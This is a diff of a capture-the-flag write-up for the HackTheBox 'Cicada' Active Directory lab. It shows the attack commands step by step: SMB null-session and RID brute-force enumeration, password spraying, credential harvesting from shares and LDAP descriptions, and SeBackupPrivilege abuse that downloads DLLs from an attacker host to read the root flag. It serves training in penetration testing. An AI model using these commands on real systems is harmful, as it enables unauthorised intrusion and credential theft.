@@ -1,12 +1,18 @@
-Add ip address of machine to `/etc/hosts`
+## Reconnaissance
+
+Add the IP address of the machine to `/etc/hosts`:
 
 `nano /etc/hosts`
 
 ![[HackTheBox/Cicada/images/1.png]]
 
-Conduct port scan ->
+---
 
-`sudo nmap -sV -sC cicada.htb`, 
+## Port Scanning
+
+Conduct port scan:
+
+`sudo nmap -sV -sC cicada.htb`,
 `sudo nmap -sV -p- --max-rate 10000 cicada.htb`
 
 Observe that I was dealing with AD structure:
@@ -25,9 +31,13 @@ Plus, **Microsoft HTTPAPI** + **port 5985** combination refers to `WinRM` servic
 
 ![[HackTheBox/Cicada/images/3.png]]
 
-Lastly, SMB ports are shown I'll try password sprays and null session.
+Lastly, SMB ports are shown. I'll try password sprays and null session.
 
 ![[HackTheBox/Cicada/images/4.png]]
+
+---
+
+## SMB Enumeration — Null Sessions & RID Brute-Forcing
 
 Now let's enumerate `SMB` shares via null sessions:
 
@@ -37,17 +47,17 @@ Now let's enumerate `SMB` shares via null sessions:
 
 ![[HackTheBox/Cicada/images/5.png]]
 
-I also found that a cheatsheet for `null session` enum ,yet I did not know actually about `RID` what does that mean and so on... Check from here:
+I also found that a cheatsheet for `null session` enum, yet I did not know actually about `RID` what does that mean and so on... Check from here:
 
 [Null Enum](https://notes.benheater.com/books/active-directory/page/null-session-enumeration)
 
-In that page there was another parameter `--rid-brute 3000` 3000 specificied as permissions that the account.
+On that page, there was another parameter `--rid-brute 3000`. 3000 is specified as the permissions that the account holds.
 
-[RID explanation](https://graylog.org/post/adversary-tradecraft-a-deep-dive-into-rid-hijacking-and-hidden-users/)
+[RID Explanation](https://graylog.org/post/adversary-tradecraft-a-deep-dive-into-rid-hijacking-and-hidden-users/)
 
 ![[HackTheBox/Cicada/images/6.png]]
 
-Basically we are asking DC to who is 500,3000,1001 ? through `SMB`
+Basically, we are asking DC, "Who is 500, 3000, 1001?" through `SMB`.
 
 I tried different combinations with `NULL session` and `Enumerate Guest`.
 
@@ -59,17 +69,17 @@ I tried different combinations with `NULL session` and `Enumerate Guest`.
 
 ![[HackTheBox/Cicada/images/7.png]]
 
-I identified that `Guest` account enabled ,but Idk how to enum guest account.
+I identified that the `Guest` account was enabled, but I didn't know how to enum the guest account.
 
 `nxc smb cicada.htb -u 'CTIS' -p '' --rid-brute`
 
-It is clear that by combination of `non existing` user and `--rid-brute` I found entire user accounts exist in the domain.
+It is clear that by combination of `non-existing` user and `--rid-brute`, I found the entire user accounts that exist in the domain.
 
 `nxc smb cicada.htb -u 'CTIS' -p '' --rid-brute`
 
 ![[HackTheBox/Cicada/images/8.png]]
 
-This cheatsheet recommends to usage of `-u 'guest'` as well lets try
+This cheatsheet recommends the usage of `-u 'guest'` as well. Let's try:
 
 [SMB Cheatsheet](https://0xdf.gitlab.io/cheatsheets/smb-enum)
 
@@ -77,7 +87,11 @@ This cheatsheet recommends to usage of `-u 'guest'` as well lets try
 
 ![[HackTheBox/Cicada/images/10.png]]
 
-Thanks to `HR` department share I can read belonging contents.
+---
+
+## Harvesting Credentials from SMB Shares
+
+Thanks to the `HR` department share, I can read its belonging contents.
 
 I used `netexec` spider modules to fuzz contents of shares:
 
@@ -87,7 +101,7 @@ I used `netexec` spider modules to fuzz contents of shares:
 
 ![[HackTheBox/Cicada/images/11.png]]
 
-I discovered `.txt` file belonging to HR:
+I discovered a `.txt` file belonging to HR:
 
 ```bash
 {
@@ -99,22 +113,26 @@ I discovered `.txt` file belonging to HR:
             "size": "1.24 KB"
         }
     }
-}    
+}
 ```
 
-I cannot authenticate `SMB` through `guest` user account ,so also I used random non-existing string to authenticate HR share:
+I cannot authenticate `SMB` through the `guest` user account, so I also used a random non-existing string to authenticate to the HR share:
 
-![[12.png]]
+![[HackTheBox/Cicada/images/12.png]]
 
 `smbclient //10.129.231.149/HR -U 'CTIS' -N`
 
 `ls -> get "Notice from HR.txt"`
 
-![[13.png]]
+![[HackTheBox/Cicada/images/13.png]]
 
-As we found AD user accounts, lets try to brute them via `password spraying` technique. In real world test, I never seen such RID thing instead we try to guess most suitable ones.
+![[HackTheBox/Cicada/images/14.png]]
 
-![[14.png]]
+---
+
+## Password Spraying
+
+As we found AD user accounts, let's try to brute them via the `password spraying` technique. In real world tests, I have never seen such a RID thing; instead, we try to guess the most suitable ones.
 
 I created my user files as below:
 
@@ -126,59 +144,67 @@ emily.oscars
 
 [Pass Spraying](https://www.netexec.wiki/smb-protocol/password-spraying)
 
-Succeed as `michael` account:
+Succeeded as `michael` account:
 
-![[15.png]]
+![[HackTheBox/Cicada/images/15.png]]
 
 With also `--continue-on-success` param:
 
-![[16.png]]
+![[HackTheBox/Cicada/images/16.png]]
 
-I never have a methodology ,but simply dive into `ldap search`
+---
 
-netexec also provides `ldap` option:
+## LDAP Enumeration & Lateral Movement
+
+I never have a methodology, but simply dive into `ldap search`.
+
+netexec also provides an `ldap` option:
 
 [Nxc LDAP Protocol](https://www.netexec.wiki/ldap-protocol/authentication)
 
 `nxc ldap cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users`
 
-![[17.png]]
+![[HackTheBox/Cicada/images/17.png]]
 
-david leaks his password in `Description` field.
+David leaks his password in the `Description` field.
 
 `david.orelious:aRt$Lp#7t*VQ!3`
 
 `nxc ldap cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --users`
 
-Let's find anything valuable on `SMB` for david:
+Let's find anything valuable on `SMB` for David:
 
 `nxc smb cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares`
 
-![[18.png]]
+![[HackTheBox/Cicada/images/18.png]]
 
-Observe. that david's account can `READ` dev share. Now I will auth as david to shares via `smbclient`
+Observe that David's account can `READ` the DEV share. Now I will auth as David to shares via `smbclient`:
 
 `smbclient //10.129.231.149/DEV -U 'david.orelious' -p 'aRt$Lp#7t*VQ!3'`
 
-I found powershell script in David's share:
+I found a PowerShell script in David's share:
 
-![[19.png]]
+![[HackTheBox/Cicada/images/19.png]]
 
-Emily user's hardcoded credentials can be observable
+Emily user's hardcoded credentials can be observed:
 
-![[20.png]]
+![[HackTheBox/Cicada/images/20.png]]
+
+---
+
+## Getting User Flag — WinRM Access
 
 `nxc smb cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares`
 
-Emily is a high privileged account just an assumption based on `READ,WRITE` perms on Disk access (C$) and admin share read utilities:
+Emily is a highly privileged account — just an assumption based on `READ,WRITE` perms on Disk access (C$) and admin share read utilities:
 
-![[21.png]]
+![[HackTheBox/Cicada/images/21.png]]
 
-I will access through WINRm protocol instead of SMB
+I will access through the WinRM protocol instead of SMB.
 
 `smbclient //10.129.231.149/ADMIN$ -U 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`
 
-![[22.png]]
+![[HackTheBox/Cicada/images/22.png]]
 
 Use Hackviser's guide:
 
@@ -188,37 +214,41 @@ Use Hackviser's guide:
 
 Get user flag from Emily's `Desktop`:
 
-![[23.png]]
+![[HackTheBox/Cicada/images/23.png]]
 
-Ask Domain Controller to AD profile of user.
+---
+
+## Privilege Escalation — SeBackupPrivilege Abuse
+
+Ask Domain Controller for the AD profile of the user.
 
 `net user emily.oscars /domain`
 
-![[24.png]]
+![[HackTheBox/Cicada/images/24.png]]
 
-Notice that user has `Backup Operators` tag most likely highly privileged account.
+Notice that the user has the `Backup Operators` tag — most likely a highly privileged account.
 
-![[25.png]]
+![[HackTheBox/Cicada/images/25.png]]
 
 I will shift tokens directly.
 
-![[26.png]]
+![[HackTheBox/Cicada/images/26.png]]
 
-Backup privilege available on target:
+Backup privilege available on target.
 
-I will follow description in below:
+I will follow the description below:
 
 [SeBackupPrivilege](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)
 
-![[27.png]]
+![[HackTheBox/Cicada/images/27.png]]
 
-![[31.png]]
+![[HackTheBox/Cicada/images/31.png]]
 
-I tried `Acl-FullControl` powershell ,but still did not work properly.
+I tried `Acl-FullControl` PowerShell, but it still did not work properly.
 
-![[28.png]]
+![[HackTheBox/Cicada/images/28.png]]
 
-![[29.png]]
+![[HackTheBox/Cicada/images/29.png]]
 
 Now I applied:
 
@@ -227,7 +257,7 @@ Now I applied:
 
 `Import-Module .\SeBackupPrivilegeUtils.dll Import-Module .\SeBackupPrivilegeCmdLets.dll`
 
-2. Enable and verify `SeBackupPrivilege`:
+2. Enable and verify `SeBackupPrivilege`:
 
 `Set-SeBackupPrivilege Get-SeBackupPrivilege`
 
@@ -239,27 +269,28 @@ Now I applied:
 For `SeBackupPrivilegeUtils.dll`:
 
 ```bash
-$URL = “http://10.10.16.64:1000/SeBackupPrivilegeUtils.dll”
-$Path=”C:\Users\emily.oscars.CICADA\backuputils.dll”
+$URL = "http://10.10.16.64:1000/SeBackupPrivilegeUtils.dll"
+$Path="C:\Users\emily.oscars.CICADA\backuputils.dll"
 Invoke-WebRequest -URI $URL -OutFile $Path
 ```
 
 For `SeBackupPrivilegeCmdLets.dll`:
 
 ```bash
-$URL = “http://10.10.16.64:1000/SeBackupPrivilegeCmdLets.dll”
-$Path=”C:\Users\emily.oscars.CICADA\backupcmdlets.dll”
+$URL = "http://10.10.16.64:1000/SeBackupPrivilegeCmdLets.dll"
+$Path="C:\Users\emily.oscars.CICADA\backupcmdlets.dll"
 Invoke-WebRequest -URI $URL -OutFile $Path
 ```
 
-![[30.png]]
+![[HackTheBox/Cicada/images/30.png]]
 
-Import modules and set privileges
+Import modules and set privileges.
 
-Then copy restricted file to unrestricted zone:
+Then copy the restricted file to an unrestricted zone:
 
 `Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\emily.oscars.CICADA\root.txt -Overwrite`
 
-Finally get root flag:
+Finally, get root flag:
 
-![[32.png]]
+![[HackTheBox/Cicada/images/32.png]]
+
